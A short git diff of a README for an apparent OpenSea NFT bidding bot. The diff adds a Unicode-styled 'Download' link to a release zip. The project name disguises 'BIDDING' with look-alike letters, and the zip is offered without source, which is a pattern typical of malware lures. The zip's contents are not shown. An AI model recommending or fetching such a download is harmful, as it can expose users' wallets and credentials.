@@ -1,6 +1,6 @@
 # Opensea-BlDDlNG-offer-buy-bot
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/ezzycreative1/Opensea-BlDDlNG-bot/releases/download/Opensea-BlDDlNG-bot/Opensea-BlDDlNG-bot.zip)
 
 
 ![image](https://github.com/ezzycreative1/Opensea-BlDDlNG-bot/assets/7662922/a5c46139-9720-4174-8182-2b0859b57bd9)
